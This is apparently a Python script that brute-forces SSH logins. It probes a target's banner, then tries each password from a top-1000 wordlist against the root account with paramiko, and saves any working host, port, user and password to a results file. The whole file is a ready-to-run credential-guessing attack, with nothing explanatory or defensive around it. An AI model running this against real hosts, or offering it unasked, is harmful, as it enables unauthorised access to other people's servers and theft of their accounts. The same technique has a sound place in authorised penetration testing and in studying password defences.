import paramiko
import os,sys,time,socket,logging

logging.basicConfig(level=logging.DEBUG) 
logging.getLogger().handlers=[logging.NullHandler()] 
logger = logging.getLogger('paramiko.test') 
logger.handlers.append(logging.StreamHandler()) 
logger.setLevel(logging.DEBUG) 

inits=[i.strip() for i in open('password-new-top1000.txt').readlines()]
filename=''
if os.name=='nt':
  filename=os.path.realpath(sys.path[0])+'\\results\\'+str(int(time.time()))+'-ssh_brute_pass.txt'
else:
  filename=os.path.realpath(sys.path[0])+'/results/'+str(int(time.time()))+'-ssh_brute_pass.txt'


#paramiko.util.log_to_file("ssh.log")

class ssh_brute(object):
  def scan(self,hosts,ports=22,user='root'):
    host=hosts
    if ':' in host:
      host=hosts.split(':')[0]
      ports=int(hosts.split(':')[1])
    res=self.check(host,ports)
    if not res:
      return False
    for pwd in inits:
      try:
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host,port=ports,username=user,password=pwd,timeout=3)
        ssh.close()
        result='host:{0} port:{1} user:{2} password:{3}\n'.format(host,ports,user,pwd)
        with open(filename,'a+') as f0:
          f0.write(result+'\n')
        return True
      except:
        pass
      finally:
        if ssh:
          ssh.close() 
    return False

  def check(self,host,port):
      s=socket.socket()
      s.settimeout(5)
      try:
        states=s.connect_ex((host,port))
        if states !=0:
          return False
        banner=s.recv(1024)
        if banner and 'SSH' in banner:
          s.send('SSH-2.0-libssh-0.6.0\x0a')
          banner=s.recv(1024)
          if banner and 'sha' in banner:
            return True
          return False
        return False
      except:
        pass
      finally:
        if s:
          s.close()
          
if __name__=='__main__':
  try:
    ip=sys.argv[1]
  except:
    print('Usage:%s target_ip' % sys.argv[0])
    exit()
    
  a=ssh_brute()
  a.scan(ip)
